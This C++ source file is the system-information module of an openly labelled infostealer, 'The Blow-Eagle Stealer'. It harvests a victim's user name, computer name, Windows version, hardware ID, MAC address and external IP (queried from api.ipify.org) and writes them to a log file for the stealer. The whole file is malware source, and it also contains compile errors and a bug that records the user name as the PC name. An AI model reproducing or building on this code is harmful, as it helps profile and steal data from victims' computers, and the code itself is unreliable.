/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include "../targets.h"
#include "../../config/config.h"

#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <fstream>
#include <string.h>
#include <string>
#include <ctime>
#include <sstream>
#include <iphlpapi.h>
#define CURL_STATICLIB
#include <curl\curl.h>

#define _CRT_SECURE_NO_WARNINGS


namespace global 
{
	std::string info = "";

	std::string logo = R"LOGO(|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗  |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝  |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░  |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░  |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗  |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝  |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|)LOGO";
}

/// <summary>
/// get User, Pc name, OS, Hwid , Mac, Time, IPs
/// </summary>
void GetGeneralInfo();

size_t WriteCallback(char* , size_t , size_t , std::string* );

void cursystem::GetSysInfo()
{
	TCHAR string[UNLEN + 1];
	DWORD sizeit = UNLEN + 1;
	GetUserName((TCHAR*)string, &sizeit);
	std::wstring ws(string);
	std::string userName(ws.begin(), ws.end());

	std::string mainPath = "C:/Users/" + userName + config::path + "/System-Info/System-Info.txt";

	GetGeneralInfo();


	std::ofstream file(mainPath, std::ios::app);
	if (file.is_open())
	{
		file << global::logo << std::endl;
		file << global::info;
	}

	file.close();
}

void GetGeneralInfo() 
{
	std::time_t currentTime = std::time(nullptr);

	// Convert the current time to a string
	std::string timeString = std::ctime(&currentTime);

	// Remove the newline character at the end of the string
	timeString.erase(timeString.find_last_not_of("\n") + 1);

	global::info += "Time and Date: " + timeString + '\n';

	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());

	global::info += "User name: " + userName + '\n';

	CHAR s[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetComputerName((TCHAR*)s, &size);
	std::wstring ws(s);
	std::string pcName(ws.begin(), ws.end());

	global::info += "PC name: " + userName + '\n';

    OSVERSIONINFOEX osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx(reinterpret_cast<OSVERSIONINFO*>(&osInfo))) {
        std::string osType;
        if (osInfo.dwMajorVersion == 10) {
            if (osInfo.dwMinorVersion == 0)
                osType = "Windows 10";
            else if (osInfo.dwMinorVersion == 1)
                osType = "Windows 10 (November 2019 Update or later)";
            else
                osType = "Windows 10";
        }
        else if (osInfo.dwMajorVersion == 6) {
            if (osInfo.dwMinorVersion == 0)
                osType = "Windows Vista";
            else if (osInfo.dwMinorVersion == 1)
                osType = "Windows 7";
            else if (osInfo.dwMinorVersion == 2) {
                if (osInfo.wProductType == VER_NT_WORKSTATION && osInfo.wSuiteMask == VER_SUITE_PERSONAL)
                    osType = "Windows 8.1 (Home Edition)";
                else
                    osType = "Windows 8.1";
            }
        }
        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 2) {
            if (GetSystemMetrics(SM_SERVERR2))
                osType = "Windows Server 2003 R2";
            else if (osInfo.wSuiteMask & VER_SUITE_STORAGE_SERVER)
                osType = "Windows Storage Server 2003";
            else if (osInfo.wProductType == VER_NT_WORKSTATION && osInfo.wSuiteMask == VER_SUITE_PERSONAL)
                osType = "Windows XP (Home Edition)";
            else
                osType = "Windows Server 2003";
        }
        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 1) {
            osType = "Windows XP";
        }
        else if (osInfo.dwMajorVersion == 5 && osInfo.dwMinorVersion == 0) {
            osType = "Windows 2000";
        }
        else {
            osType = "Unknown Windows Version";
        }

        global::info += "Windows OS Type: " + osType + '\n';
    }
    else {
        global::info += "Windows OS Type: Failed to retrieve OS information." + '\n';
    }


    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    std::wstring ws(hwProfileInfo.szHwProfileGuid);
    std::string HWID(ws.begin(), ws.end());
    size_t end = std::size(HWID);
    HWID = HWID.substr(1, end - 2);

    global::info += "Hwid: " + HWID;

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufferSize = sizeof(adapterInfo);

	DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
	if (result == ERROR_BUFFER_OVERFLOW) {
		std::cerr << "Insufficient buffer size" << std::endl;
	}
	else if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to get adapter information" << std::endl;
	}

	PIP_ADAPTER_INFO adapter = adapterInfo;
	std::stringstream macAddress;

	for (; adapter != nullptr; adapter = adapter->Next) {
		if (adapter->AddressLength != 6) {
			continue;  // Skip non-physical adapters
		}
		macAddress << ":";
		for (DWORD i = 0; i < adapter->AddressLength; ++i) {
			if (i > 0) {
				macAddress << ":";
			}

			macAddress << std::hex << static_cast<int>(adapter->Address[i]);
		}
		macAddress << ":";
		break;
	}

	//std::cout << "MAC Address: " << macAddress.str() << std::endl;

	std::string mac = "";

	for (size_t i = 0; i < std::size(macAddress.str()); i++)
	{
		if (isdigit(macAddress.str()[i]) && macAddress.str()[i - 1] == ':' && macAddress.str()[i + 1] == ':')
		{
			mac += '0';
		}
		mac += macAddress.str()[i];
	}

	mac = mac.substr(1, std::size(mac) - 2);

	global::info += "MAC Address: " + mac;


	std::string ipAddress = "";

	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
		}

		curl_easy_cleanup(curl);
	}
	
	global::info += "External IP Address: " + ipAddress;


}

size_t WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
	size_t totalSize = size * nmemb;
	output->append(contents, totalSize);
	return totalSize;
}